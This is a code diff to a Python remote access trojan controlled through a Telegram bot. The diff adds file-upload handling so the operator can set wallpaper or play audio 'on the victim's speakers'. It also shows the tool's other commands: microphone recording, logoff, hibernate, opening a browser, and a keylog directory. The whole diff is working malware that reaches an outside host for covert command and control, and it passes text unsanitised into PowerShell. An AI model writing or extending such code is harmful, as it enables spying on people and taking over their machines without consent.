@@ -398,10 +398,31 @@ atexit.register(_telegram_mark_offline)
 
 _TELEGRAM_HEARTBEAT_RUNNING = True
 _TG_CMD_LAST_UPDATE_ID = 0
+_TG_PENDING_ACTION = None
+
+def _download_tg_file(file_id: str, save_path: str) -> bool:
+    """Download a file from Telegram by file_id."""
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
+        resp = requests.post(url, json={"file_id": file_id}, timeout=15)
+        if resp.status_code != 200:
+            return False
+        file_path = resp.json().get("result", {}).get("file_path", "")
+        if not file_path:
+            return False
+        dl_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
+        r = requests.get(dl_url, timeout=120)
+        if r.status_code == 200:
+            with open(save_path, 'wb') as f:
+                f.write(r.content)
+            return True
+    except:
+        pass
+    return False
 
 def _telegram_command_listener():
     """Poll Telegram getUpdates and execute commands from authorized chat."""
-    global _TG_CMD_LAST_UPDATE_ID
+    global _TG_CMD_LAST_UPDATE_ID, _TG_PENDING_ACTION
     if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_") or not TELEGRAM_CHAT_ID:
         return
     while True:
@@ -420,14 +441,17 @@ def _telegram_command_listener():
                 if chat_id != str(TELEGRAM_CHAT_ID):
                     continue
                 text = msg.get("text", "").strip()
-                if not text:
+                if text:
+                    _handle_telegram_command(text)
                     continue
-                _handle_telegram_command(text)
+                if _TG_PENDING_ACTION:
+                    _handle_telegram_file(msg)
         except:
             time.sleep(5)
 
 def _handle_telegram_command(text: str):
     """Process a single Telegram command and respond."""
+    global _TG_PENDING_ACTION
     parts = text.split(maxsplit=1)
     cmd = parts[0].lower()
     args = parts[1] if len(parts) > 1 else ""
@@ -467,10 +491,12 @@ def _handle_telegram_command(text: str):
             "/logoff - Log off user\n"
             "/hibernate - Hibernate\n"
             "/speak <text> - Text to speech\n"
-            "/wallpaper <url> - Change wallpaper\n"
+            "/speak - Send audio file to play\n"
+            "/wallpaper - Send image to set as wallpaper\n"
             "/browser <url> - Open in browser\n"
             "/status - Quick status\n"
-            "/mic [secs] - Record microphone"
+            "/mic [secs] - Record microphone\n"
+            "/cancel - Cancel pending file upload"
         )
 
     elif cmd == "/info":
@@ -795,32 +821,23 @@ def _handle_telegram_command(text: str):
         except:
             _send_telegram("Hibernate failed")
 
-    elif cmd == "/speak":
-        if not args:
-            _send_telegram("Usage: /speak <text>")
-            return
-        try:
-            subprocess.run(['powershell', '-Command',
-                f'Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak("{args.strip()}")'],
-                creationflags=_NO_WINDOW, close_fds=True)
-            _send_telegram(f"Spoken: {args.strip()}")
-        except:
-            _send_telegram("Speak failed")
 
     elif cmd == "/wallpaper":
-        if not args:
-            _send_telegram("Usage: /wallpaper <url>")
-            return
-        try:
-            img_path = os.path.join(KEYLOG_DIR, "_wp.jpg")
-            resp = requests.get(args.strip(), timeout=30)
-            with open(img_path, 'wb') as f:
-                f.write(resp.content)
-            import ctypes
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, img_path, 3)
-            _send_telegram("Wallpaper changed")
-        except:
-            _send_telegram("Wallpaper change failed")
+        _TG_PENDING_ACTION = "wallpaper"
+        _send_telegram("Send the image you want to set as wallpaper...")
+
+    elif cmd == "/speak":
+        if args:
+            try:
+                subprocess.run(['powershell', '-Command',
+                    f'Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak("{args.strip()}")'],
+                    creationflags=_NO_WINDOW, close_fds=True)
+                _send_telegram(f"Spoken: {args.strip()}")
+            except:
+                _send_telegram("Speak failed")
+        else:
+            _TG_PENDING_ACTION = "speak_audio"
+            _send_telegram("Send an audio file to play on the victim's speakers...")
 
     elif cmd == "/browser":
         if not args:
@@ -877,8 +894,58 @@ def _handle_telegram_command(text: str):
         except:
             _send_telegram("Mic record failed")
 
+    elif cmd == "/cancel":
+        _TG_PENDING_ACTION = None
+        _send_telegram("Pending action cancelled")
+
     else:
         _send_telegram(f"Unknown command: {cmd}\nType /help for commands")
+
+def _handle_telegram_file(msg: dict):
+    """Handle a file sent by the user when a pending action is waiting."""
+    global _TG_PENDING_ACTION
+    _NO_WINDOW = 0x08000000
+    action = _TG_PENDING_ACTION
+    _TG_PENDING_ACTION = None
+
+    file_id = None
+    if msg.get("photo"):
+        file_id = msg["photo"][-1]["file_id"]
+    elif msg.get("document"):
+        file_id = msg["document"]["file_id"]
+    elif msg.get("audio") or msg.get("voice"):
+        file_id = (msg.get("audio") or msg.get("voice"))["file_id"]
+    elif msg.get("video"):
+        file_id = msg["video"]["file_id"]
+
+    if not file_id:
+        _send_telegram("No file detected. Action cancelled.")
+        return
+
+    tmp_path = os.path.join(KEYLOG_DIR, "_tg_pending_file")
+    if not _download_tg_file(file_id, tmp_path):
+        _send_telegram("Failed to download file. Action cancelled.")
+        return
+
+    try:
+        if action == "wallpaper":
+            import ctypes
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, tmp_path, 3)
+            _send_telegram("Wallpaper changed")
+        elif action == "speak_audio":
+            subprocess.run(['powershell', '-Command',
+                f'(New-Object Media.SoundPlayer "{tmp_path}").PlaySync()'],
+                creationflags=_NO_WINDOW, close_fds=True, timeout=120)
+            _send_telegram("Audio played")
+        else:
+            _send_telegram(f"Unknown pending action: {action}")
+    except:
+        _send_telegram(f"Failed to execute {action}")
+    finally:
+        try:
+            os.remove(tmp_path)
+        except:
+            pass
 
 def _telegram_heartbeat(cloudflared_url: str):
     """Periodically delete old status message and send fresh one with current time."""
